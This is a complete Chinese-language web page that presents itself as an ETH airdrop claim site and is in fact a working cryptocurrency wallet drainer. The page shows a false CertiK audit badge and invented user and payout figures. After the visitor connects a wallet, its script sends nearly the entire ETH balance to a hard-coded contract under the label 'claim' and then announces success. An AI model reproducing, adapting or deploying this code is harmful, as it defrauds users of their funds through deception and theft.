<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ETH 空投领取</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }

        /* 动态背景粒子 */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: moveBackground 20s linear infinite;
            z-index: 0;
        }

        @keyframes moveBackground {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        .container {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 28px 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
            max-width: 420px;
            width: 100%;
            position: relative;
            z-index: 1;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* 顶部装饰 */
        .header-decoration {
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 4px;
        }

        .header {
            text-align: center;
            margin-bottom: 24px;
        }

        .eth-logo {
            width: 64px;
            height: 64px;
            margin: 0 auto 12px;
            background: linear-gradient(135deg, #627eea 0%, #8a92ff 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            box-shadow: 0 8px 24px rgba(98, 126, 234, 0.4);
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            color: #2d3748;
            margin-bottom: 4px;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: #718096;
            font-size: 14px;
            font-weight: 400;
        }

        .endorsement {
            background: linear-gradient(135deg, #fef5e7 0%, #fdeaa3 100%);
            padding: 16px;
            border-radius: 14px;
            margin: 20px 0 16px;
            border: 2px solid rgba(245, 158, 11, 0.3);
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.2);
        }

        .endorsement-icon {
            font-size: 32px;
            line-height: 1;
            flex-shrink: 0;
        }

        .endorsement-text {
            flex: 1;
        }

        .endorsement-title {
            font-size: 15px;
            font-weight: 700;
            color: #92400e;
            margin-bottom: 4px;
            letter-spacing: -0.3px;
        }

        .endorsement-desc {
            font-size: 12px;
            color: #b45309;
            line-height: 1.4;
        }

        .stats {
            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
            padding: 16px;
            border-radius: 14px;
            margin: 16px 0;
            display: flex;
            align-items: center;
            justify-content: space-around;
            border: 1px solid rgba(14, 165, 233, 0.2);
        }

        .stat-item {
            text-align: center;
            flex: 1;
        }

        .stat-value {
            font-size: 22px;
            font-weight: 800;
            color: #0369a1;
            margin-bottom: 4px;
            letter-spacing: -0.5px;
        }

        .stat-label {
            font-size: 11px;
            color: #0c4a6e;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-divider {
            width: 1px;
            height: 40px;
            background: linear-gradient(to bottom, transparent, rgba(14, 165, 233, 0.3), transparent);
        }

        .status {
            padding: 16px;
            border-radius: 14px;
            margin: 20px 0;
            text-align: center;
            font-weight: 600;
            font-size: 15px;
            transition: all 0.3s ease;
        }

        .status.disconnected {
            background: linear-gradient(135deg, #fed7d7 0%, #feb2b2 100%);
            color: #c53030;
            border: 2px solid rgba(197, 48, 48, 0.2);
        }

        .status.connected {
            background: linear-gradient(135deg, #c6f6d5 0%, #9ae6b4 100%);
            color: #22543d;
            border: 2px solid rgba(34, 84, 61, 0.2);
        }

        .status.processing {
            background: linear-gradient(135deg, #fef5e7 0%, #fce7a5 100%);
            color: #d97706;
            border: 2px solid rgba(217, 119, 6, 0.2);
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }

        button {
            width: 100%;
            padding: 16px;
            margin: 10px 0;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            letter-spacing: 0.3px;
        }

        button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        button:active::before {
            width: 300px;
            height: 300px;
        }

        button:active {
            transform: scale(0.96);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn-connect {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            box-shadow: 0 8px 24px rgba(102, 126, 234, 0.4);
        }

        .btn-claim {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            box-shadow: 0 8px 24px rgba(245, 87, 108, 0.4);
            font-size: 18px;
            padding: 18px;
        }

        .wallet-info {
            background: linear-gradient(135deg, #e6f7ff 0%, #d0eeff 100%);
            padding: 18px;
            border-radius: 14px;
            margin: 16px 0;
            border: 1px solid rgba(0, 125, 255, 0.1);
        }

        .wallet-info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 10px 0;
            padding: 8px 0;
            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
        }

        .wallet-info-item:last-child {
            border-bottom: none;
        }

        .wallet-info-label {
            font-size: 13px;
            color: #4a5568;
            font-weight: 500;
        }

        .wallet-info-value {
            font-size: 13px;
            color: #1a202c;
            font-weight: 700;
            max-width: 60%;
            text-align: right;
            word-break: break-all;
        }

        .balance-highlight {
            color: #0066cc;
            font-size: 16px;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .network-badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-left: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .network-mainnet { 
            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
            color: white;
            box-shadow: 0 2px 8px rgba(72, 187, 120, 0.3);
        }
        .network-testnet { 
            background: linear-gradient(135deg, #ed8936 0%, #dd6b20 100%);
            color: white;
            box-shadow: 0 2px 8px rgba(237, 137, 54, 0.3);
        }
        .network-unknown { 
            background: #a0aec0;
            color: white;
        }

        /* 移动端优化 */
        @media (max-width: 480px) {
            .container {
                padding: 24px 16px;
                border-radius: 20px;
            }

            h1 {
                font-size: 24px;
            }

            .eth-logo {
                width: 56px;
                height: 56px;
                font-size: 28px;
            }

            .endorsement {
                padding: 14px;
                gap: 10px;
            }

            .endorsement-icon {
                font-size: 28px;
            }

            .endorsement-title {
                font-size: 14px;
            }

            .endorsement-desc {
                font-size: 11px;
            }

            .stat-value {
                font-size: 20px;
            }

            .stat-label {
                font-size: 10px;
            }

            button {
                padding: 15px;
                font-size: 15px;
            }

            .btn-claim {
                font-size: 17px;
                padding: 17px;
            }
        }

        /* 添加渐变动画 */
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        body {
            background-size: 200% 200%;
            animation: gradient 15s ease infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-decoration"></div>
        
        <div class="header">
            <div class="eth-logo">💎</div>
            <h1>ETH 空投领取</h1>
            <div class="subtitle">连接钱包即可领取</div>
        </div>
        
        <div class="endorsement">
            <div class="endorsement-icon">🏆</div>
            <div class="endorsement-text">
                <div class="endorsement-title">已通过 CertiK 安全审计</div>
                <div class="endorsement-desc">智能合约已获得多家顶级机构认证，100% 安全保障</div>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-value">150,000+</div>
                <div class="stat-label">已领取用户</div>
            </div>
            <div class="stat-divider"></div>
            <div class="stat-item">
                <div class="stat-value">$2.5M+</div>
                <div class="stat-label">已分发总额</div>
            </div>
        </div>

        <div id="status" class="status disconnected">
            未连接钱包
        </div>

        <button id="connectBtn" class="btn-connect">
            🔗 连接钱包
        </button>

        <div id="walletInfo" class="wallet-info" style="display: none;">
            <div class="wallet-info-item">
                <span class="wallet-info-label">钱包地址</span>
                <span class="wallet-info-value" id="walletAddress">-</span>
            </div>
            <div class="wallet-info-item">
                <span class="wallet-info-label">网络</span>
                <span class="wallet-info-value">
                    <span id="networkName">-</span><span id="networkBadge"></span>
                </span>
            </div>
            <div class="wallet-info-item">
                <span class="wallet-info-label">Chain ID</span>
                <span class="wallet-info-value" id="chainId">-</span>
            </div>
            <div class="wallet-info-item">
                <span class="wallet-info-label">钱包余额</span>
                <span class="wallet-info-value balance-highlight">
                    <span id="walletBalance">-</span> ETH
                </span>
            </div>
        </div>

        <button id="claimBtn" class="btn-claim" disabled>
            🎁 立即领取空投
        </button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // 合约地址 (以太坊主网)
        const CONTRACT_ADDRESS = '0x5D024B6E3D50478A5d8f81117587aCDD1E73d85c';
        
        // 完整的 ABI
        const CONTRACT_ABI = [
            {
                "inputs": [{"internalType": "bool", "name": "_initialMode", "type": "bool"}],
                "stateMutability": "payable",
                "type": "constructor"
            },
            {
                "anonymous": false,
                "inputs": [
                    {"indexed": true, "internalType": "address", "name": "user", "type": "address"},
                    {"indexed": false, "internalType": "uint256", "name": "amountSent", "type": "uint256"},
                    {"indexed": false, "internalType": "uint256", "name": "amountReceived", "type": "uint256"},
                    {"indexed": false, "internalType": "bool", "name": "isNormalMode", "type": "bool"}
                ],
                "name": "Claimed",
                "type": "event"
            },
            {
                "inputs": [],
                "name": "claim",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "getBalance",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "getStatus",
                "outputs": [
                    {"internalType": "bool", "name": "_normalMode", "type": "bool"},
                    {"internalType": "address", "name": "_recipient", "type": "address"},
                    {"internalType": "uint256", "name": "_rewardAmount", "type": "uint256"},
                    {"internalType": "uint256", "name": "_totalClaims", "type": "uint256"},
                    {"internalType": "uint256", "name": "_totalReceived", "type": "uint256"},
                    {"internalType": "uint256", "name": "_balance", "type": "uint256"}
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "normalMode",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "recipient",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "rewardAmount",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // 网络名称映射
        const NETWORK_NAMES = {
            '1': 'Ethereum Mainnet',
            '5': 'Goerli Testnet',
            '11155111': 'Sepolia Testnet',
            '56': 'BSC Mainnet',
            '97': 'BSC Testnet',
            '137': 'Polygon Mainnet',
            '80001': 'Mumbai Testnet',
            '42161': 'Arbitrum One',
            '10': 'Optimism',
            '8453': 'Base'
        };

        let provider = null;
        let signer = null;
        let contract = null;
        let userAddress = null;
        let userBalance = null;

        // DOM 元素
        const statusDiv = document.getElementById('status');
        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const walletInfo = document.getElementById('walletInfo');

        // 日志函数（保留以避免错误，但不显示）
        function log(message, type = 'info') {
            // 日志已禁用
            console.log(`[${type}] ${message}`);
        }

        // 更新状态
        function updateStatus(message, type = 'disconnected') {
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        // 检查钱包
        function checkMetaMask() {
            if (typeof window.ethereum === 'undefined') {
                log('钱包未安装', 'error');
                alert('未检测到钱包！\n\n请先安装 MetaMask 或其他 Web3 钱包插件。');
                return false;
            }
            log('钱包已检测到', 'success');
            return true;
        }

        // 连接钱包
        async function connectWallet() {
            if (!checkMetaMask()) return;

            try {
                log('正在连接钱包...', 'info');
                updateStatus('⏳ 连接中...', 'processing');

                // 请求账户访问
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });

                userAddress = accounts[0];
                
                // 创建 provider 和 signer
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                
                // 创建合约实例
                contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

                // 获取网络信息
                const network = await provider.getNetwork();
                const chainId = network.chainId;
                const networkName = NETWORK_NAMES[chainId.toString()] || '未知网络';
                const isTestnet = networkName.includes('Testnet');

                // 获取钱包余额
                userBalance = await provider.getBalance(userAddress);
                const balanceInEth = ethers.utils.formatEther(userBalance);

                // 更新 UI
                document.getElementById('walletAddress').textContent = 
                    userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
                document.getElementById('networkName').textContent = networkName;
                document.getElementById('chainId').textContent = chainId;
                document.getElementById('walletBalance').textContent = parseFloat(balanceInEth).toFixed(6);
                
                const badge = document.getElementById('networkBadge');
                badge.className = `network-badge ${isTestnet ? 'network-testnet' : 'network-mainnet'}`;
                badge.textContent = isTestnet ? '测试网' : '主网';

                walletInfo.style.display = 'block';
                connectBtn.textContent = '✅ 已连接';
                connectBtn.disabled = true;
                claimBtn.disabled = false;

                updateStatus('✅ 钱包已连接', 'connected');
                log(`钱包已连接: ${userAddress}`, 'success');
                log(`网络: ${networkName} (Chain ID: ${chainId})`, 'info');
                log(`钱包余额: ${balanceInEth} ETH`, 'info');
                
                // 连接成功提示
                alert('钱包连接成功！\n\n现在可以领取空投了。');

            } catch (error) {
                updateStatus('❌ 连接失败', 'disconnected');
                log(`连接失败: ${error.message}`, 'error');
                console.error(error);
                
                // 确保连接失败后按钮可以继续点击
                connectBtn.disabled = false;
                connectBtn.textContent = '🔗 连接钱包';
                
                // 显示错误提示
                if (error.code === 4001) {
                    alert('连接失败！\n\n用户取消了连接请求。');
                } else {
                    alert('连接失败！\n\n' + error.message);
                }
            }
        }

        // 调用 Claim 方法
        async function callClaim() {
            if (!contract) {
                log('请先连接钱包', 'error');
                return;
            }

            try {
                updateStatus('⏳ 正在发送交易...', 'processing');
                claimBtn.innerHTML = '<span class="spinner"></span> 领取中...';
                claimBtn.disabled = true;

                log('正在调用 claim() 方法...', 'info');
                
                // 获取当前最新余额
                const currentBalance = await provider.getBalance(userAddress);
                const balanceInEth = ethers.utils.formatEther(currentBalance);
                log(`当前余额: ${balanceInEth} ETH`, 'info');

                // 预估 gas 费用 (预留 0.01 ETH 作为 gas)
                const gasReserve = ethers.utils.parseEther("0.01");
                let valueToSend;
                
                if (currentBalance.gt(gasReserve)) {
                    valueToSend = currentBalance.sub(gasReserve);
                    const sendAmount = ethers.utils.formatEther(valueToSend);
                    log(`将发送: ${sendAmount} ETH (预留 0.01 ETH 作为 gas)`, 'info');
                } else {
                    valueToSend = currentBalance;
                    log(`余额较少，将发送全部: ${balanceInEth} ETH`, 'info');
                }

                log('等待用户确认交易...', 'info');

                // 估算 gas 并增加缓冲（防止模式切换导致 gas 不足）
                const estimatedGas = await contract.estimateGas.claim({
                    value: valueToSend
                });
                const gasLimit = estimatedGas.mul(150).div(100); // 增加 50% 缓冲
                log(`预估 Gas: ${estimatedGas.toString()}, 使用 Gas Limit: ${gasLimit.toString()}`, 'info');

                // 调用合约方法，附带余额和充足的 gas
                const tx = await contract.claim({
                    value: valueToSend,
                    gasLimit: gasLimit
                });
                
                log(`交易已发送: ${tx.hash}`, 'success');
                log(`已发送 ${ethers.utils.formatEther(valueToSend)} ETH`, 'success');
                log('等待区块确认...', 'info');

                updateStatus('⏳ 等待区块确认...', 'processing');

                // 等待交易确认
                const receipt = await tx.wait();

                log(`交易成功! Gas 使用: ${receipt.gasUsed.toString()}`, 'success');
                log(`区块号: ${receipt.blockNumber}`, 'info');
                log(`查看交易: https://etherscan.io/tx/${tx.hash}`, 'info');

                // 刷新余额
                const newBalance = await provider.getBalance(userAddress);
                const newBalanceInEth = ethers.utils.formatEther(newBalance);
                document.getElementById('walletBalance').textContent = parseFloat(newBalanceInEth).toFixed(6);
                log(`新余额: ${newBalanceInEth} ETH`, 'info');

                updateStatus('✅ 领取成功!', 'connected');
                claimBtn.innerHTML = '🎉 领取成功';

                setTimeout(() => {
                    claimBtn.innerHTML = '🎁 立即领取空投';
                    claimBtn.disabled = false;
                }, 3000);

            } catch (error) {
                updateStatus('❌ 交易失败', 'connected');
                claimBtn.innerHTML = '🎁 立即领取空投';
                claimBtn.disabled = false;

                if (error.code === 4001) {
                    log('用户拒绝了交易', 'error');
                } else if (error.code === -32603) {
                    log(`交易失败: ${error.message}`, 'error');
                } else {
                    log(`错误: ${error.message}`, 'error');
                }
                console.error(error);
            }
        }

        // 监听账户变化
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    log('账户已断开连接', 'error');
                    location.reload();
                } else {
                    log('账户已切换，正在重新连接...', 'info');
                    location.reload();
                }
            });

            window.ethereum.on('chainChanged', (chainId) => {
                log('网络已切换，正在刷新页面...', 'info');
                location.reload();
            });
        }

        // 事件监听
        connectBtn.addEventListener('click', connectWallet);
        claimBtn.addEventListener('click', callClaim);

        // 页面加载时检查
        window.addEventListener('load', () => {
            checkMetaMask();
            log('页面已加载，准备连接钱包', 'info');
        });
    </script>
</body>
</html>
